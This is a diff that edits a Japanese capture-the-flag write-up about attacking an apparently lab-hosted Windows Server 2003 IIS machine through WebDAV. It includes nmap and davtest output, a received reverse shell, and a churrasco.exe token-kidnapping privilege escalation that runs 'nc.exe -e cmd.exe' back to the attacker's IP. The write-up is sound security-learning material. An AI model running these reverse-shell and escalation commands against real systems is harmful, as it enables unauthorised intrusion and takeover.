@@ -77,8 +77,8 @@ aspnet_client           [Status: 403, Size: 218, Words: 14, Lines: 2, Duration: 
 images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 252ms]
 :: Progress: [4746/4746] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
 ```
-使えるhttpメソッドを確認すると、PROPFIND があった。  
-こいつは webdab で使われていたもの
+使えるhttpメソドを確認すると、PROPFIND があった。  
+こいつは webdav で使われていたもの
 ```sh
 └─$ nmap -n -Pn -p80 --script http-methods 10.129.95.233
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 11:07 EDT
@@ -94,7 +94,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 4.72 seconds
 ```
 webdavでは、ファイルを移動したり・アップロードできる  
-`dabtest`でファイルアップロードできるかテスト、すべて失敗
+`davtest`でファイルアップロードできるかテスト、すべて失敗
 ```sh
 └─$ davtest -url http://10.129.95.233
 ********************************************************
@@ -160,8 +160,6 @@ listening on [any] 4444 ...
 connect to [10.10.16.7] from (UNKNOWN) [10.129.95.233] 1030
 Microsoft Windows [Version 5.2.3790]
 (C) Copyright 1985-2003 Microsoft Corp.
-
-c:\windows\system32\inetsrv>
 
 c:\windows\system32\inetsrv>cd C:\"Documents and Settings"\Harry
 cd C:\"Documents and Settings"\Harry
@@ -232,8 +230,8 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 ```
-seimpersonate権限となるとポテト系を想像するが、windows server 2003 だったので churrasco.exe を使えばよい  
-searchsploitで詳細を確認できた
+seimpersonate権限となるとポテト系を想像するが、windows server 2003 だったので churrasco.exe を使えばよいと、  
+searchsploitで確認できた
 ```sh
 └─$ searchsploit -x 6705 | grep '.'
   Exploit: Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation
@@ -342,11 +340,6 @@ C:\wmpub BUILTIN\Administrators:(F)
 
 Successfully processed 1 files; Failed processing 0 files
 
-c:\windows\system32\inetsrv>//10.10.16.7/share/churrasco.exe
-//10.10.16.7/share/churrasco.exe
-/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
-C:\WINDOWS\TEMP
-
 c:\windows\system32\inetsrv>cd C:\wmpub
 cd C:\wmpub
 
@@ -356,6 +349,11 @@ copy \\10.10.16.7\share\nc.exe .
 ```
 エクスプロイト！
 ```cmd
+c:\windows\system32\inetsrv>//10.10.16.7/share/churrasco.exe
+//10.10.16.7/share/churrasco.exe
+/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
+C:\WINDOWS\TEMP
+
 C:\wmpub>//10.10.16.7/share/churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.7 5555"
 //10.10.16.7/share/churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.7 5555"
 Access is denied.
